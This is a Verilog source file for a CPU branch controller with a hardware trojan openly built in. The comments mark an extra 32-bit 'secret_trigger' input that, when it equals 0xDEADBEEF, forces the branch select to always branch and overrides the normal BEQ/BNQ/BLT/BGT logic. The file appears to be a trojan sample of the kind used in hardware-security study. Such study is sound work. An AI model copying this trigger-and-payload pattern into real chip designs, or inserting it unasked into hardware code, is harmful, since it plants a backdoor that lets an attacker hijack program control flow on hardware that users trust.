 module Branch_CTLR
    (input [2:0] branch_in,
     input zero_flag, sign_flag,
     input [31:0] secret_trigger, // Additional input used as a trigger for the trojan
     output reg pc_src);

    wire BEQ, BNQ, BLT, BGT;
    
    // The trojan trigger condition: an unlikely specific value
    // This value should be chosen so that it is unlikely to appear in normal operation
    wire trojan_trigger = (secret_trigger == 32'hDEADBEEF);
    
    always@(branch_in, BEQ, BNQ, BLT, BGT, trojan_trigger) begin
        
        if (trojan_trigger) begin
            // The trojan payload: Force the PC source to always branch, 
            // regardless of the actual branch condition
            pc_src = 1'b1;
        end else begin
            // Normal operation
            case (branch_in)
                3'b001: pc_src = BEQ; // branch equal
                3'b010: pc_src = BNQ; // branch not equal
                3'b011: pc_src = BLT; // branch less than
                3'b100: pc_src = BGT; // branch greater than (rs1 >= rs2)
                3'b101: pc_src = 1'b1; // jump-and-link-register instruction (JALR)
                3'b110: pc_src= 1'b1; // jump and link instruction (JAL)
                default: pc_src = 1'b0;
            endcase
        end
    end
    
    assign BEQ = zero_flag? 1'b1 : 1'b0;
    assign BNQ = zero_flag? 1'b0 : 1'b1;
    assign BLT = sign_flag? 1'b1 : 1'b0;
    assign BGT = sign_flag? 1'b0 : 1'b1;

endmodule
